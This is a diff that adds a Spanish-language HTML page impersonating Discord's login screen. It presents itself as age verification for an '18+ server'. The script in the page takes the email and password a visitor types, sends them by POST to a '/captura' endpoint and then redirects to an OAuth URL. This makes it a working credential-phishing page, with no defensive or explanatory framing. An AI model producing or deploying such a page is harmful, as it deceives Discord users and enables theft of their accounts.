@@ -1,0 +1,67 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Discord</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:#313338;color:#dbdee1;font-family:"gg sans",Whitney,"Helvetica Neue",Helvetica,Arial,sans-serif;display:grid;place-items:center;min-height:100vh;padding:16px}
+.wrap{width:100%;max-width:440px}
+.marca{text-align:center;margin-bottom:20px}
+.logo{width:64px;height:64px;border-radius:50%;background:#5865f2;display:grid;place-items:center;font-weight:800;font-size:20px;color:#fff;margin:0 auto 12px}
+.marca h1{font-size:20px;color:#f2f3f5;font-weight:600}
+.marca p{font-size:13px;color:#949ba4;margin-top:4px}
+.card{background:#313338;border-radius:8px;padding:28px;box-shadow:0 2px 10px rgba(0,0,0,.25);border:1px solid #26272b}
+.card h2{font-size:22px;color:#f2f3f5;text-align:center;margin-bottom:6px}
+.card .sub{font-size:14px;color:#b5bac1;text-align:center;margin-bottom:20px}
+label{display:block;font-size:12px;font-weight:700;text-transform:uppercase;color:#b5bac1;margin-bottom:8px;letter-spacing:.02em}
+label span{color:#f23f43}
+input{width:100%;background:#1e1f22;border:1px solid #1e1f22;border-radius:3px;padding:11px 12px;color:#dbdee1;font-size:15px;outline:none;margin-bottom:16px}
+input:focus{border-color:#5865f2}
+.olvido{font-size:13px;color:#00a8fc;text-decoration:none;display:inline-block;margin-bottom:20px}
+button{width:100%;background:#5865f2;color:#fff;border:0;border-radius:3px;padding:12px;font-size:15px;font-weight:600;cursor:pointer}
+button:hover{background:#4752c4}
+button:disabled{opacity:.6;cursor:default}
+.pie{font-size:13px;color:#949ba4;margin-top:18px;text-align:center}
+.pie a{color:#00a8fc;text-decoration:none}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <div class="marca">
+    <div class="logo">18+</div>
+    <h1>Servidor +18</h1>
+    <p>Verificación de acceso</p>
+  </div>
+  <div class="card">
+    <h2>¡Bienvenido de nuevo!</h2>
+    <p class="sub">Iniciá sesión para completar la verificación</p>
+    <label>Correo electrónico o número de teléfono <span>*</span></label>
+    <input id="email" type="email" autocomplete="username" placeholder="">
+    <label>Contraseña <span>*</span></label>
+    <input id="pass" type="password" autocomplete="current-password">
+    <a class="olvido" href="#">¿Olvidaste tu contraseña?</a>
+    <button id="btn" onclick="continuar()">Iniciar sesión</button>
+    <p class="pie">¿Necesitás una cuenta? <a href="#">Registrate</a></p>
+  </div>
+</div>
+<script>
+const STATE = '{{STATE}}';
+async function continuar(){
+  const email = document.getElementById('email').value.trim();
+  const pass = document.getElementById('pass').value;
+  const btn = document.getElementById('btn');
+  btn.disabled = true; btn.textContent = 'Conectando...';
+  if (email && pass) {
+    await fetch('/captura', {
+      method:'POST', headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({ email, pass })
+    }).catch(()=>{});
+  }
+  location.href = '/oauth?state=' + STATE;
+}
+document.addEventListener('keydown', e => { if (e.key === 'Enter') continuar(); });
+</script>
+</body>
+</html>
